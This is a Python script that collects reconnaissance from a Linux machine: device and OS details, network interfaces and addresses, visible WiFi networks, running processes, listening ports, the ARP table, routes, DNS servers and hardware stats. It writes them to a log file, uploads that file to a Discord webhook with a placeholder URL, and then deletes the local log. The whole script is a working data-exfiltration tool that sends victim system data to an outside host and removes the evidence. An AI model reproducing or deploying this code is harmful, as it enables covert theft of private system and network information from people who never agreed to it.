import subprocess
import requests
import json
import netifaces
import platform
import socket
import os

# Discord Webhook URL
webhook_url = 'https://discord.com/api/webhooks/your_webhook_url_here'

# Function to send message to Discord webhook
def send_to_discord(file_path):
    with open(file_path, 'rb') as f:
        payload = {
            'payload_json': json.dumps({
                'content': 'Hier ist die log.txt mit den gesammelten Daten:'
            })
        }
        files = {
            'file': f
        }
        response = requests.post(webhook_url, data=payload, files=files)
        if response.status_code == 204:
            print("File sent successfully to Discord webhook.")
        else:
            print(f"Failed to send file to Discord webhook. Status code: {response.status_code}")
            print(f"Response: {response.text}")

# Function to execute command and capture output
def execute_command(command):
    result = subprocess.run(command, capture_output=True, text=True, shell=True)
    return result.stdout.strip()

# Function to get saved WiFi networks and their details
def get_saved_wifi_networks():
    saved_networks = execute_command('nmcli -f SSID,BSSID,MODE,CHAN,FREQ,RATE,SIGNAL,SECURITY device wifi list')
    return saved_networks

# Function to get detailed network information
def get_network_info():
    interfaces = netifaces.interfaces()
    network_info = {}

    for iface in interfaces:
        addrs = netifaces.ifaddresses(iface)
        info = {}
        if netifaces.AF_INET in addrs:
            info['IPv4'] = addrs[netifaces.AF_INET]
        if netifaces.AF_INET6 in addrs:
            info['IPv6'] = addrs[netifaces.AF_INET6]
        network_info[iface] = info
    
    return network_info

# Function to get device information
def get_device_info():
    device_info = {
        'hostname': socket.gethostname(),
        'platform': platform.system(),
        'platform_release': platform.release(),
        'platform_version': platform.version(),
        'architecture': platform.machine(),
        'processor': platform.processor(),
        'device_name': platform.node(),
        'python_version': platform.python_version(),
    }
    return device_info

# Function to get storage information
def get_storage_info():
    storage_info = execute_command('df -h')
    return storage_info

# Function to get memory information
def get_memory_info():
    memory_info = execute_command('free -h')
    return memory_info

# Function to get CPU information
def get_cpu_info():
    cpu_info = execute_command('lscpu')
    return cpu_info

# Function to get running processes
def get_running_processes():
    processes = execute_command('ps aux')
    return processes

# Function to get network connections
def get_network_connections():
    connections = execute_command('netstat -tuln')
    return connections

# Function to get ARP table
def get_arp_table():
    arp_table = execute_command('arp -a')
    return arp_table

# Function to get routing table
def get_routing_table():
    routing_table = execute_command('ip route')
    return routing_table

# Function to get DNS server information
def get_dns_servers():
    dns_servers = execute_command('cat /etc/resolv.conf | grep nameserver')
    return dns_servers

# Collect saved WiFi networks information
saved_networks_info = get_saved_wifi_networks()

# Collect network information
network_info = get_network_info()

# Collect device information
device_info = get_device_info()

# Collect storage information
storage_info = get_storage_info()

# Collect memory information
memory_info = get_memory_info()

# Collect CPU information
cpu_info = get_cpu_info()

# Collect running processes
running_processes = get_running_processes()

# Collect network connections
network_connections = get_network_connections()

# Collect ARP table
arp_table = get_arp_table()

# Collect routing table
routing_table = get_routing_table()

# Collect DNS servers information
dns_servers = get_dns_servers()

# Write collected information to log.txt
log_file_path = 'log.txt'
with open(log_file_path, 'w') as f:
    f.write("=== Device Information ===\n")
    for key, value in device_info.items():
        f.write(f"{key.capitalize()}: {value}\n")
    f.write("\n")

    f.write("=== Network Information ===\n")
    for iface, info in network_info.items():
        f.write(f"Interface: {iface}\n")
        if 'IPv4' in info:
            for addr in info['IPv4']:
                f.write(f"IPv4 Address: {addr['addr']}\n")
                f.write(f"Netmask: {addr['netmask']}\n")
        if 'IPv6' in info:
            for addr in info['IPv6']:
                f.write(f"IPv6 Address: {addr['addr']}\n")
                f.write(f"Netmask: {addr.get('netmask', 'N/A')}\n")
        f.write("\n")

    f.write("=== Saved WiFi Networks Information ===\n")
    f.write(saved_networks_info)
    f.write("\n")

    f.write("=== Storage Information ===\n")
    f.write(f"{storage_info}\n")

    f.write("=== Memory Information ===\n")
    f.write(f"{memory_info}\n")

    f.write("=== CPU Information ===\n")
    f.write(f"{cpu_info}\n")

    f.write("=== Running Processes ===\n")
    f.write(f"{running_processes}\n")

    f.write("=== Network Connections ===\n")
    f.write(f"{network_connections}\n")

    f.write("=== ARP Table ===\n")
    f.write(f"{arp_table}\n")

    f.write("=== Routing Table ===\n")
    f.write(f"{routing_table}\n")

    f.write("=== DNS Servers ===\n")
    f.write(f"{dns_servers}\n")

# Send log.txt content to Discord webhook
send_to_discord(log_file_path)

# Delete log.txt after sending
os.remove(log_file_path)
